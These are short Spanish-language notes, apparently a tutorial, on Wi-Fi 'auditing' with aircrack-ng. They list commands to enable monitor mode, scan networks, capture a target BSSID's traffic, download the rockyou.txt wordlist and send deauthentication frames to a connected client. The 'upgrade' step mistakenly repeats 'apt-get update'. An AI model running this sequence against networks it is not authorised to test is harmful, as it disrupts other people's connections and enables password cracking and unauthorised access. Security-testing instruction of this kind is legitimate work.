Habilitar el usuario root
    sudo su

actualización de los paquetes en los repositorios del sistema
    apt-get update

Corremos el upgrade de los paquetes en el sistema
    apt-get update


Herramienta para auditar redes
sudo apt install aircrack-ng

aircrack.ng 
Obtener un diccionario de claves rockyou.txt es de buena calidad
https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&ved=2ahUKEwiRsJD3-riKAxWhp5UCHVbWOOMQFnoECAoQAQ&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd

Poder conocer valores de red
ifconfig

Obtenemos el nombre de red y con el siguiente comando ponemos nuestra red en modo monitor
airmon-ng start nombre_red

Obtener el nombre de todas las redes disponibles
airodump-ng nombre_redmon

Una vez obtenida el nombre de red a auditar, copiamos BSSID y el numero de canal que ocupa
airodump-ng -c numero_canal --bssid clave-BSSID -w nombre_auditoria nombre_redmon

Obtenemos clave-BSSID de la señal y de una estacion que este ocupandola
aireplay-ng -0 9 -a clave-BSSID -c clave-BSSID_station nombre_redmon
